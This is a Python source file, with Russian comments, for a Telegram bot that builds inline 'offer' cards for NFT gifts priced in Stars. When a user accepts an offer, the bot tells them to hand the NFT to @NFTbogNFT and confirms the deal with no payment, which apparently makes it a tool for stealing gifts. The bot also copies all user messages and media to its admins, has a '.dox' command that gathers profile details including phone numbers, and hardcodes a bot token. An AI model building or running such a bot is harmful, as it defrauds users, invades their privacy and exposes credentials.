import asyncio
import os
import asyncpg
import logging
from aiogram import Bot, Dispatcher, F, Router, BaseMiddleware
from aiogram.filters import Command
from aiogram.types import (
    CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, 
    InlineQueryResultArticle, InputTextMessageContent, Message, TelegramObject,
    ReplyKeyboardMarkup, KeyboardButton
)
from aiogram.types.inline_query import InlineQuery
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from aiogram.utils.keyboard import InlineKeyboardBuilder

# ==========================================
# НАСТРОЙКА БАЗЫ ДАННЫХ (PostgreSQL)
# ==========================================
DATABASE_URL = os.getenv("DATABASE_URL")
if DATABASE_URL and DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

db_pool = None

async def init_db():
    global db_pool
    if DATABASE_URL:
        db_pool = await asyncpg.create_pool(DATABASE_URL)
        async with db_pool.acquire() as conn:
            await conn.execute('''CREATE TABLE IF NOT EXISTS admins (user_id BIGINT PRIMARY KEY)''')
            await conn.execute('''CREATE TABLE IF NOT EXISTS banned (user_id BIGINT PRIMARY KEY)''')
            await conn.execute('''CREATE TABLE IF NOT EXISTS users (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT)''')
            await conn.execute('''CREATE TABLE IF NOT EXISTS tickets (id SERIAL PRIMARY KEY, user_id BIGINT, username TEXT, text TEXT)''')
            await conn.execute('INSERT INTO admins (user_id) VALUES ($1) ON CONFLICT DO NOTHING', MAIN_ADMIN_ID)
    else:
        print("⚠️ DATABASE_URL не найден, используется локальный SQLite")
        import sqlite3
        global sqlite_conn, sqlite_cursor
        sqlite_conn = sqlite3.connect('bot_database.db', check_same_thread=False)
        sqlite_cursor = sqlite_conn.cursor()
        sqlite_cursor.execute('''CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)''')
        sqlite_cursor.execute('''CREATE TABLE IF NOT EXISTS banned (user_id INTEGER PRIMARY KEY)''')
        sqlite_cursor.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT)''')
        sqlite_cursor.execute('''CREATE TABLE IF NOT EXISTS tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT, text TEXT)''')
        sqlite_cursor.execute('INSERT OR IGNORE INTO admins (user_id) VALUES (?)', (MAIN_ADMIN_ID,))
        sqlite_conn.commit()

MAIN_ADMIN_ID = 8648153709  # <-- ВАШ ID

# ==========================================
# УНИВЕРСАЛЬНЫЕ ФУНКЦИИ ДЛЯ БАЗЫ
# ==========================================
async def db_fetch(query, *args):
    if db_pool:
        async with db_pool.acquire() as conn:
            # Превращаем ? в $1, $2 для Postgres
            for i in range(1, len(args) + 1):
                query = query.replace("?", f"${i}", 1)
            return await conn.fetch(query, *args)
    else:
        sqlite_cursor.execute(query, args)
        return sqlite_cursor.fetchall()

async def db_execute(query, *args):
    if db_pool:
        async with db_pool.acquire() as conn:
            for i in range(1, len(args) + 1):
                query = query.replace("?", f"${i}", 1)
            await conn.execute(query, *args)
    else:
        sqlite_cursor.execute(query, args)
        sqlite_conn.commit()

async def is_admin(user_id: int) -> bool:
    res = await db_fetch('SELECT 1 FROM admins WHERE user_id = ?', user_id)
    return len(res) > 0

async def is_banned(user_id: int) -> bool:
    res = await db_fetch('SELECT 1 FROM banned WHERE user_id = ?', user_id)
    return len(res) > 0

# ==========================================
# БОТ И ДИСПЕТЧЕР
# ==========================================
TOKEN = "9036357642:AAH_Lgeh6txPI896xxnIpRPN8SbCiO7RxE8" # <-- ВАШ ТОКЕН
bot = Bot(token=TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)

# ==========================================
# MIDDLEWARE (Блокировка)
# ==========================================
class BanMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        user = data.get("event_from_user")
        if user and await is_banned(user.id):
            return
        return await handler(event, data)

dp.message.middleware(BanMiddleware())
dp.callback_query.middleware(BanMiddleware())
dp.inline_query.middleware(BanMiddleware())

# ==========================================
# СОСТОЯНИЯ FSM
# ==========================================
class AdminStates(StatesGroup):
    waiting_for_admin_id = State()
    waiting_for_ban_id = State()
    waiting_for_unban_id = State()
    waiting_for_remove_admin_id = State()
    waiting_for_broadcast = State()
    waiting_for_ticket = State()
    waiting_for_reply = State()

active_offers = {}
user_tickets = {}

# ==========================================
# УВЕДОМЛЕНИЯ АДМИНАМ
# ==========================================
async def notify_admin(text: str, reply_markup=None):
    admins = await db_fetch('SELECT user_id FROM admins')
    for row in admins:
        admin_id = row['user_id'] if db_pool else row[0]
        try:
            await bot.send_message(admin_id, text, reply_markup=reply_markup)
        except:
            pass

# ==========================================
# ОБЫЧНЫЕ КОМАНДЫ И ТИКЕТЫ
# ==========================================
@router.message(Command("start", "offer"))
async def cmd_start(message: Message):
    await db_execute('INSERT INTO users (user_id, username, first_name) VALUES (?, ?, ?) ON CONFLICT DO NOTHING' if db_pool else 'INSERT OR IGNORE INTO users (user_id, username, first_name) VALUES (?, ?, ?)', 
                   message.from_user.id, message.from_user.username, message.from_user.first_name)
    
    kb = ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="✉️ Связаться с админом")]], resize_keyboard=True)
    
    await message.answer(
        "🤖 Бот активен!\n\nНапиши в любом чате:\n@nftoffer333_bot ссылка | цена\n\nЕсли есть вопросы — нажми кнопку ниже.",
        reply_markup=kb
    )

@router.message(F.text == "✉️ Связаться с админом")
async def contact_admin_btn(message: Message, state: FSMContext):
    await message.answer("Напишите ваш вопрос или жалобу одним сообщением:")
    await state.set_state(AdminStates.waiting_for_ticket)

@router.message(AdminStates.waiting_for_ticket)
async def process_ticket(message: Message, state: FSMContext):
    username = f"@{message.from_user.username}" if message.from_user.username else "без юзернейма"
    await db_execute('INSERT INTO tickets (user_id, username, text) VALUES (?, ?, ?)', message.from_user.id, username, message.text)
    
    res = await db_fetch('SELECT MAX(id) FROM tickets')
    ticket_id = res[0]['max'] if db_pool else res[0][0]
    user_tickets[ticket_id] = message.from_user.id
    
    builder = InlineKeyboardBuilder()
    builder.button(text="✍️ Ответить", callback_data=f"reply_{ticket_id}")
    
    await notify_admin(f"🎫 **Тикет #{ticket_id}**\nОт: {username} (ID: {message.from_user.id})\nТекст: {message.text}", reply_markup=builder.as_markup())
    await message.answer("✅ Сообщение отправлено!")
    await state.clear()

@router.callback_query(F.data.startswith("reply_"))
async def reply_to_ticket(callback: CallbackQuery, state: FSMContext):
    if not await is_admin(callback.from_user.id): return
    ticket_id = int(callback.data.split("_")[1])
    await callback.message.answer(f"Введите ответ для тикета #{ticket_id}:")
    await state.update_data(ticket_id=ticket_id)
    await state.set_state(AdminStates.waiting_for_reply)
    await callback.answer()

@router.message(AdminStates.waiting_for_reply)
async def send_reply(message: Message, state: FSMContext):
    data = await state.get_data()
    ticket_id = data.get("ticket_id")
    user_id = user_tickets.get(ticket_id)
    
    if user_id:
        try:
            await bot.send_message(user_id, f"📬 **Ответ от админа:**\n\n{message.text}", parse_mode="Markdown")
            await message.answer("✅ Ответ отправлен!")
        except:
            await message.answer("❌ Не удалось (заблокировал бота).")
    await state.clear()

# ==========================================
# ИНЛАЙН РЕЖИМ
# ==========================================
@router.inline_query()
async def inline_handler(inline_query: InlineQuery):
    query = inline_query.query.strip()
    username = f"@{inline_query.from_user.username}" if inline_query.from_user.username else "без юзернейма"
    
    await db_execute('INSERT INTO users (user_id, username, first_name) VALUES (?, ?, ?) ON CONFLICT DO NOTHING' if db_pool else 'INSERT OR IGNORE INTO users (user_id, username, first_name) VALUES (?, ?, ?)', 
                   inline_query.from_user.id, inline_query.from_user.username, inline_query.from_user.first_name)
    
    if not query: return
        
    chat_types = {"sender": "в личке", "private": "в личке", "group": "в группе", "supergroup": "в супергруппе", "channel": "в канале"}
    location = chat_types.get(inline_query.chat_type, "неизвестно")
    
    await notify_admin(f"🔍 Поиск в инлайне ({location})!\nИмя: {inline_query.from_user.first_name}\nID: {inline_query.from_user.id}\nТекст: {query}")
    
    link = "t.me/nft/LunarSnake-120435"
    price = "600"
    
    if query:
        if "|" in query:
            parts = [p.strip() for p in query.split("|")]
            link = parts[0] if parts[0] else link
            price = parts[1] if len(parts) > 1 and parts[1] else price
        else:
            parts = query.split()
            link = parts[0] if parts[0] else link
            price = parts[1] if len(parts) > 1 and parts[1] else price

    gift_name = link.split("/")[-1] if "/" in link else "Gift"
    offer_id = str(hash(f"{inline_query.from_user.id}_{link}_{price}"))[-8:]
    active_offers[offer_id] = {"link": link, "price": price, "gift": gift_name, "creator_id": inline_query.from_user.id, "creator_name": username}

    keyboard = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Отклонить", callback_data=f"dec_{offer_id}"),
        InlineKeyboardButton(text="Принять", callback_data=f"acc_{offer_id}")
    ]])

    card_text = f"🎁 {gift_name} • {price} ⭐️ Stars\n🔗 {link}\n\nПользователь предлагает вам сделку."
    result = InlineQueryResultArticle(id=offer_id, title=f"{gift_name} • {price} ⭐️ Stars", description="Отправить оффер", input_message_content=InputTextMessageContent(message_text=card_text), reply_markup=keyboard)

    try:
        await inline_query.answer([result], cache_time=0)
        await notify_admin(f"📝 **Новый оффер!**\nСоздал: {username}\nТовар: {gift_name}\nЦена: {price} ⭐️\nГде: {location}")
    except Exception as e:
        print(f">>> ОШИБКА ИНЛАЙНА: {e}")

# ==========================================
# ОБРАБОТКА ОФФЕРОВ
# ==========================================
@router.callback_query(F.data.startswith("acc_"))
async def accept_callback(callback: CallbackQuery):
    offer_id = callback.data.split("_")[1]
    offer = active_offers.get(offer_id, {"link": "t.me/nft/LunarSnake", "price": "600", "gift": "Gift", "creator_id": 0})
    
    username = f"@{callback.from_user.username}" if callback.from_user.username else "без юзернейма"
    chat_info = f"в чате '{callback.message.chat.title or callback.message.chat.first_name}'" if callback.message else "в инлайне"
    
    builder = InlineKeyboardBuilder()
    if offer.get("creator_id"):
        builder.button(text="🚫 Забанить автора", callback_data=f"quickban_{offer['creator_id']}")
    
    await notify_admin(f"✅ Оффер принят!\nКто: {username}\nГде: {chat_info}\nАвтор: {offer.get('creator_name', '?')}", reply_markup=builder.as_markup())
    
    accepted_text = f"✅ Оффер принят!\n🎁 {offer['gift']} • {offer['price']} ⭐️ Stars\n🔗 {offer['link']}\n\n• Передайте NFT на @NFTbogNFT"
    new_keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🎁 Передать NFT", url="https://t.me/NFTbogNFT")], [InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"conf_{offer_id}")]])
    
    await callback.answer()
    try:
        if callback.inline_message_id:
            await bot.edit_message_text(inline_message_id=callback.inline_message_id, text=accepted_text, reply_markup=new_keyboard)
        elif callback.message:
            await callback.message.edit_text(text=accepted_text, reply_markup=new_keyboard)
    except: pass

@router.callback_query(F.data.startswith("quickban_"))
async def quick_ban_callback(callback: CallbackQuery):
    if not await is_admin(callback.from_user.id): return
    ban_id = int(callback.data.split("_")[1])
    await db_execute('INSERT INTO banned (user_id) VALUES (?) ON CONFLICT DO NOTHING' if db_pool else 'INSERT OR IGNORE INTO banned (user_id) VALUES (?)', ban_id)
    await callback.message.edit_text(callback.message.text + f"\n\n🚫 **Автор {ban_id} забанен!**")
    await callback.answer("Забанен!")

@router.callback_query(F.data.startswith("conf_"))
async def confirm_callback(callback: CallbackQuery):
    offer_id = callback.data.split("_")[1]
    offer = active_offers.get(offer_id, {"price": "600"})
    await callback.answer(f"Оффер принят!\nПередайте NFT на @NFTbogNFT\nСумма: {offer['price']} Stars.", show_alert=True)

@router.callback_query(F.data.startswith("dec_"))
async def decline_callback(callback: CallbackQuery):
    offer_id = callback.data.split("_")[1]
    await callback.answer("❌ Оффер отклонен.", show_alert=True)
    try:
        if callback.inline_message_id:
            await bot.edit_message_text(inline_message_id=callback.inline_message_id, text="❌ Оффер отклонен.", reply_markup=None)
        elif callback.message:
            await callback.message.edit_text(text="❌ Оффер отклонен.", reply_markup=None)
    except: pass

# ==========================================
# АДМИН-ПАНЕЛЬ
# ==========================================
@router.message(Command("admin"))
async def admin_panel(message: Message):
    if not await is_admin(message.from_user.id): return
    builder = InlineKeyboardBuilder()
    builder.button(text="➕ Добавить админа", callback_data="admin_add")
    builder.button(text="❌ Убрать админа", callback_data="admin_remove")
    builder.button(text="📋 Список админов", callback_data="admin_list")
    builder.button(text="🚫 Забанить", callback_data="admin_ban")
    builder.button(text="✅ Разбанить", callback_data="admin_unban")
    builder.button(text="📢 Рассылка", callback_data="admin_broadcast")
    builder.button(text="📊 Активные офферы", callback_data="admin_offers")
    builder.adjust(1)
    await message.answer("🛠 **Админ-панель**", reply_markup=builder.as_markup(), parse_mode="Markdown")

@router.callback_query(F.data == "admin_offers")
async def list_offers_btn(callback: CallbackQuery):
    if not await is_admin(callback.from_user.id): return
    if not active_offers:
        await callback.message.answer("Нет активных офферов.")
        await callback.answer()
        return
    text = "📊 **Активные офферы:**\n\n"
    for i, (oid, offer) in enumerate(active_offers.items(), start=1):
        text += f"{i}. {offer.get('gift')} • {offer.get('price')} ⭐️\nАвтор: {offer.get('creator_name', '?')}\n\n"
    await callback.message.answer(text, parse_mode="Markdown")
    await callback.answer()

@router.callback_query(F.data == "admin_add")
async def add_admin_btn(callback: CallbackQuery, state: FSMContext):
    if not await is_admin(callback.from_user.id): return
    await callback.message.answer("Отправьте ID нового админа:")
    await state.set_state(AdminStates.waiting_for_admin_id)
    await callback.answer()

@router.callback_query(F.data == "admin_remove")
async def remove_admin_btn(callback: CallbackQuery, state: FSMContext):
    if not await is_admin(callback.from_user.id): return
    await callback.message.answer("Отправьте ID для снятия прав:")
    await state.set_state(AdminStates.waiting_for_remove_admin_id)
    await callback.answer()

@router.callback_query(F.data == "admin_ban")
async def ban_user_btn(callback: CallbackQuery, state: FSMContext):
    if not await is_admin(callback.from_user.id): return
    await callback.message.answer("Отправьте ID для бана:")
    await state.set_state(AdminStates.waiting_for_ban_id)
    await callback.answer()

@router.callback_query(F.data == "admin_unban")
async def unban_user_btn(callback: CallbackQuery, state: FSMContext):
    if not await is_admin(callback.from_user.id): return
    await callback.message.answer("Отправьте ID для разбана:")
    await state.set_state(AdminStates.waiting_for_unban_id)
    await callback.answer()

@router.callback_query(F.data == "admin_list")
async def list_admins_btn(callback: CallbackQuery):
    if not await is_admin(callback.from_user.id): return
    admins = await db_fetch('SELECT user_id FROM admins')
    text = "👑 **Админы:**\n\n"
    for i, row in enumerate(admins, 1):
        text += f"{i}. `{row['user_id'] if db_pool else row[0]}`\n"
    await callback.message.answer(text, parse_mode="Markdown")
    await callback.answer()

# ==========================================
# FSM ОБРАБОТЧИКИ
# ==========================================
@router.message(AdminStates.waiting_for_admin_id)
async def process_add_admin(message: Message, state: FSMContext):
    try:
        await db_execute('INSERT INTO admins (user_id) VALUES (?) ON CONFLICT DO NOTHING' if db_pool else 'INSERT OR IGNORE INTO admins (user_id) VALUES (?)', int(message.text))
        await message.answer("✅ Админ добавлен!")
    except: await message.answer("❌ Ошибка.")
    await state.clear()

@router.message(AdminStates.waiting_for_remove_admin_id)
async def process_remove_admin(message: Message, state: FSMContext):
    try:
        await db_execute('DELETE FROM admins WHERE user_id = ?', int(message.text))
        await message.answer("✅ Права сняты!")
    except: await message.answer("❌ Ошибка.")
    await state.clear()

@router.message(AdminStates.waiting_for_ban_id)
async def process_ban_user(message: Message, state: FSMContext):
    try:
        await db_execute('INSERT INTO banned (user_id) VALUES (?) ON CONFLICT DO NOTHING' if db_pool else 'INSERT OR IGNORE INTO banned (user_id) VALUES (?)', int(message.text))
        await message.answer("🚫 Забанен!")
    except: await message.answer("❌ Ошибка.")
    await state.clear()

@router.message(AdminStates.waiting_for_unban_id)
async def process_unban_user(message: Message, state: FSMContext):
    try:
        await db_execute('DELETE FROM banned WHERE user_id = ?', int(message.text))
        await message.answer("✅ Разбанен!")
    except: await message.answer("❌ Ошибка.")
    await state.clear()

@router.callback_query(F.data == "admin_broadcast")
async def broadcast_btn(callback: CallbackQuery, state: FSMContext):
    if not await is_admin(callback.from_user.id): return
    await callback.message.answer("Отправьте текст для рассылки:")
    await state.set_state(AdminStates.waiting_for_broadcast)
    await callback.answer()

@router.message(AdminStates.waiting_for_broadcast)
async def process_broadcast(message: Message, state: FSMContext):
    await state.clear()
    users = await db_fetch('SELECT user_id FROM users')
    if not users:
        await message.answer("❌ База пуста.")
        return
    await message.answer(f"⏳ Рассылка для {len(users)} чел...")
    success = 0
    for row in users:
        uid = row['user_id'] if db_pool else row[0]
        try:
            await bot.send_message(uid, message.text)
            success += 1
        except: pass
        await asyncio.sleep(0.05)
    await message.answer(f"✅ Доставлено: {success}")

# ==========================================
# КОМАНДА .DOX
# ==========================================
@router.message(F.text.startswith(".dox "))
async def dox_user(message: Message):
    if not await is_admin(message.from_user.id): return
    target = message.text.split(maxsplit=1)[1].strip()
    try:
        chat = await bot.get_chat(int(target) if target.isdigit() else f"@{target.replace('@', '')}")
        text = f"🕵️ **Досье:**\n\n👤 Имя: {chat.first_name or 'Нет'}\n🔗 Юзернейм: @{chat.username if chat.username else 'Нет'}\n🆔 ID: `{chat.id}`\n📞 Номер: {chat.phone_number or 'Скрыт'}"
        await message.answer(text, parse_mode="Markdown")
    except:
        await message.answer("❌ Не найден.")

# ==========================================
# МЕДИА И ТЕКСТ
# ==========================================
def get_user_info(message: Message) -> str:
    username = f"@{message.from_user.username}" if message.from_user.username else "без юзернейма"
    return f"👤 От: {message.from_user.first_name} ({username}, ID: {message.from_user.id})"

async def forward_to_admins(message: Message, media_type: str):
    admins = await db_fetch('SELECT user_id FROM admins')
    for row in admins:
        try:
            admin_id = row['user_id'] if db_pool else row[0]
            await bot.send_message(admin_id, f"📎 Прислали {media_type}!\n{get_user_info(message)}")
            await message.copy_to(chat_id=admin_id)
        except: pass

@router.message(F.text & ~F.text.startswith("/") & ~F.text.startswith("."))
async def text_handler(message: Message):
    await notify_admin(f"💬 Новое сообщение!\n{get_user_info(message)}\nТекст: {message.text}")

@router.message(F.photo)
async def photo_handler(message: Message): await forward_to_admins(message, "фото 🖼")
@router.message(F.video)
async def video_handler(message: Message): await forward_to_admins(message, "видео 🎬")
@router.message(F.animation)
async def gif_handler(message: Message): await forward_to_admins(message, "гифку 🎞")
@router.message(F.sticker)
async def sticker_handler(message: Message): await forward_to_admins(message, "стикер 🐱")

# ==========================================
# ЗАПУСК
# ==========================================
async def main():
    print("1. Запуск...")
    await init_db()
    print("2. База подключена!")
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        print("3. Polling...")
        await dp.start_polling(bot)
    except Exception as e:
        print(f"ОШИБКА: {e}")

if __name__ == "__main__":
    asyncio.run(main())
